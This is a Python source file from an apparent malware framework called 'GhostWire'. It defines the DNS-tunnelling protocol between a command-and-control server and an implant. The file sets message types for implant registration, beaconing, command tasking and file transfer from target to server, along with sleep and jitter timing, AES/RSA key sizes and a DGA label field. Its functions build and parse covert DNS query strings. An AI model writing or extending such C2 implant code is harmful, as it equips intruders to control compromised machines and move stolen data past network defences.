"""
GhostWire Protocol Definitions
================================
Defines the message types, formats, and constants used
for communication between the C2 server and the implant.
"""

# ============================================================
# MESSAGE TYPES
# ============================================================

MSG_REGISTER = "reg"  # First time connecting
MSG_BEACON = "bcon"  # Heartbeat ("I'm alive")
MSG_DATA = "data"  # Sending command output
MSG_CMDREQ = "cmd"  # Asking for a new command
MSG_UPLOAD = "upld"  # File from target to server
MSG_DOWNLOAD = "dnld"  # File from server to target
MSG_EXIT = "exit"  # Implant shutting down

# Server response codes (sent as TXT records)
RESP_ACK = "ACK"
RESP_CMD = "CMD"
RESP_ERR = "ERR"
RESP_NOOP = "NOOP"
RESP_EXIT = "EXIT"

# ============================================================
# PROTOCOL CONSTANTS
# ============================================================

MAX_DNS_LABEL = 63
MAX_DNS_QUERY = 253
DNS_PORT = 5353

DEFAULT_SLEEP = 60
DEFAULT_JITTER = 30

AES_KEY_SIZE = 32
AES_BLOCK_SIZE = 16
RSA_KEY_SIZE = 2048

# Placeholder for empty encoded_data field
EMPTY_DATA = "X"

# Markers for chunked transfers
KEY_END_MARKER = "KEY_END"    # Signals end of RSA key exchange
DATA_END_MARKER = "DONE"      # Signals end of encrypted data transfer


# ============================================================
# MESSAGE FORMAT
# ============================================================
# All DNS queries ALWAYS have this format (5 fields + domain):
#
#   <session_id>.<msg_type>.<chunk_num>.<encoded_data>.<dga_label>.<domain>
#
# If encoded_data is empty, we use "X" as placeholder.
# This keeps the format consistent so parsing always works.
#
# Example with data:
#   a1b2c3d4.data.0.eJwzNjQ1.33eb760e75d7.ghostwire.local
#
# Example without data:
#   a1b2c3d4.reg.0.X.33eb760e75d7.ghostwire.local


def build_query(session_id, msg_type, encoded_data="", chunk_num=0, dga_label="", domain=""):
    """
    Build a DNS query string.

    ALWAYS uses "X" for empty data to keep format consistent.
    """
    data_field = encoded_data if encoded_data else EMPTY_DATA

    parts = [session_id, msg_type, str(chunk_num), data_field]

    if dga_label:
        parts.append(dga_label)

    if domain:
        parts.append(domain)

    query = ".".join(parts)

    if len(query) > MAX_DNS_QUERY:
        raise ValueError(f"DNS query too long: {len(query)} > {MAX_DNS_QUERY}")

    return query


def parse_query(query_string, domain_suffix=""):
    """
    Parse an incoming DNS query string into components.

    Since the domain can contain dots (e.g., "ghostwire.local"),
    we need to know the domain suffix to parse from the end.
    """
    query_string = query_string.rstrip(".")

    # If we know the domain, split it off from the end first
    if domain_suffix:
        domain_parts = domain_suffix.split(".")
        num_domain_parts = len(domain_parts)
        all_parts = query_string.split(".")

        # The last N parts are the domain
        domain = ".".join(all_parts[-num_domain_parts:])
        remaining = all_parts[:-num_domain_parts]
    else:
        # Fallback: assume domain is last 2 parts
        all_parts = query_string.split(".")
        if len(all_parts) > 5:
            domain = ".".join(all_parts[-2:])
            remaining = all_parts[:-2]
        else:
            domain = ""
            remaining = all_parts

    result = {
        'session_id': remaining[0] if len(remaining) > 0 else None,
        'msg_type': remaining[1] if len(remaining) > 1 else None,
        'chunk_num': int(remaining[2]) if len(remaining) > 2 else 0,
        'encoded_data': remaining[3] if len(remaining) > 3 and remaining[3] != EMPTY_DATA else "",
        'dga_label': remaining[4] if len(remaining) > 4 else "",
        'domain': domain
    }

    return result
